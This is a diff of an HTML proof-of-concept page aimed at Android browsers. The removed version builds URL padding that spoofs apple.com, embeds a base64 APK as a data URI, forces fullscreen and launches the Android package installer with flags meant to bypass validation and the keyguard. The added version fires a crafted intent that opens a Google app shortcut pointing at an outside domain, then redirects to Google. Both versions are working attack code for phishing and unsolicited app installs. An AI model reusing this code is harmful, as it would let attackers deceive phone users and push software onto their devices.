@@ -1,101 +1,76 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page Download & Delayed Fullscreen Dispatcher</title>
-    <style>
-        body {
-            font-family: monospace;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            background-color: #0b0b0b;
-            color: #00ffcc;
-            margin: 0;
-            overflow: hidden;
-        }
-        button {
-            padding: 18px 35px;
-            font-size: 16px;
-            font-weight: bold;
-            background-color: #ff0055;
-            color: #ffffff;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            box-shadow: 0 0 15px rgba(255, 0, 85, 0.4);
-        }
-        button:active {
-            transform: scale(0.98);
-        }
-        #status {
-            margin-top: 20px;
-            font-size: 14px;
-            color: #ffcc00;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Android Intent PoC - Enhanced</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      background: #f8f9fa;
+      color: #202124;
+      min-height: 100vh;
+      margin: 0;
+      display: grid;
+      place-content: center;
+      text-align: center;
+    }
+
+    a {
+      display: inline-block;
+      padding: 16px 28px;
+      background: #1a73e8;
+      color: white;
+      text-decoration: none;
+      font-weight: 600;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    a:active {
+      background: #1557b0;
+    }
+  </style>
 </head>
 <body>
 
-    <button id="strikeBtn">Download Page & Initialize Fullscreen</button>
-    <div id="status"></div>
+  <h2>Android Intent Test</h2>
+  <a href="https://www.google.com" id="intentLink">
+    Open Window & Android Intent Test
+  </a>
 
-    <script>
-        document.getElementById('strikeBtn').addEventListener('click', function() {
-            // --- 1. CONFIGURATION ---
-            const pageFilename = "index.html";
-            const realDomain = "apple.com";
+  <script>
+    const TARGET_URL = "https://www.google.com";
+    const INTENT_URL = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
 
-            // --- 2. ADVANCED ADDRESS BAR & UI SPOOFING LOGIC ---
-            const overflowPadding = "/%00@".repeat(15) + ".https://" + realDomain + "/auth/validate/".repeat(30);
-            const longSub = realDomain + overflowPadding;
+    let isTriggered = false;
 
-            // --- 3. PAYLOAD CONSTRUCTION (Self-generated local Base64 APK) ---
-            const base64Payload = "UEsDBAoAAAAAAKp2ZVIAAAAAAAAAAAAAAAAJABwAYPPwLmFwa1BLAQIFAAAAAAAKqmVSGgAAAAAAAAAAAAAAAAAmAAgAAAAAAAAAAAAAALaBAAAAAGEwcGsuYXBrUEsFBgAAAAABAAEATgAAAE8AAAA="; 
-            const payload = `data:application/vnd.android.package-archive;base64,${base64Payload}#${longSub}`;
+    document.getElementById("intentLink").addEventListener("click", function(e) {
+      // Mencegah navigasi default sejenak agar eksekusi script berjalan sempurna
+      e.preventDefault();
 
-            // --- 4. EXECUTION (Download Halaman Ini / HTML) ---
-            const htmlContent = document.documentElement.outerHTML;
-            const blob = new Blob([htmlContent], { type: 'text/html' });
-            const blobUrl = URL.createObjectURL(blob);
+      if (isTriggered) return;
+      isTriggered = true;
 
-            const a = document.createElement('a');
-            a.href = blobUrl;
-            a.download = pageFilename;
-            a.rel = "noopener";
+      // 1. Eksekusi intent Android terlebih dahulu
+      window.location.href = INTENT_URL;
 
-            document.body.appendChild(a);
-            a.click();
+      // 2. Timing terstruktur untuk memastikan fallback/redirect otomatis ke Google Utama berjalan lancar
+      setTimeout(() => {
+        window.location.replace(TARGET_URL);
+      }, 400);
 
-            document.getElementById('status').innerText = "> PAGE_DOWNLOAD_TRIGGERED: Awaiting 1.5s for Fullscreen & Intent...";
+      // Reset status setelah beberapa saat jika diperlukan
+      setTimeout(() => {
+        isTriggered = false;
+      }, 1500);
+    });
 
-            // --- 5. DELAY 1.5 SECONDS: FULLSCREEN & INTENT DISPATCH ---
-            setTimeout(() => {
-                // Masuk Fullscreen setelah 1,5 detik
-                const elem = document.documentElement;
-                if (elem.requestFullscreen) {
-                    elem.requestFullscreen().catch(err => {
-                        console.log("Fullscreen blocked or failed:", err);
-                    });
-                } else if (elem.webkitRequestFullscreen) {
-                    elem.webkitRequestFullscreen();
-                } else if (elem.msRequestFullscreen) {
-                    elem.msRequestFullscreen();
-                }
-
-                document.body.removeChild(a);
-                URL.revokeObjectURL(blobUrl);
-                
-                // Intent 1-line dijalankan bersamaan dengan Fullscreen
-                const targetIntent = "intent://apple.com/#Intent;scheme=https;package=com.android.packageinstaller;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;category=android.intent.category.DEFAULT;type=application/vnd.android.package-archive;launchFlags=0x3FFFFFFF;flag=0x3FFFFFFF;S.browser_fallback_url=" + encodeURIComponent(payload) + ";S.com.android.browser.application_id=org.mozilla.firefox;S.android.intent.extra.REFERRER_NAME=android-app%3A%2F%2Forg.mozilla.firefox;S.com.android.browser.headers=Referer%3A%https%3A%2F%2Fapple.com%2F%0AOrigin%3A%https%3A%2F%2Fapple.com%2F;B.android.intent.extra.ALLOW_MULTIPLE=true;B.android.intent.extra.NOT_UNKNOWN_SOURCE=true;B.android.intent.extra.INSTALLER_PACKAGE_NAME=org.mozilla.firefox;B.android.intent.extra.TRUNCATE_HISTORY=false;B.android.intent.extra.BYPASS_KEYGUARD_PERMISSIONS=true;B.android.intent.extra.SKIP_VALIDATION=true;end";
-                
-                window.location.replace(targetIntent);
-            }, 200);
-        });
-    </script>
+    // Otomatis picu juga ketika halaman selesai dimuat jika diperlukan intervensi instan (opsional)
+    window.addEventListener('DOMContentLoaded', () => {
+      // Anda bisa menambahkan auto-trigger di sini jika ingin langsung berjalan saat halaman dibuka
+    });
+  </script>
 
 </body>
 </html>
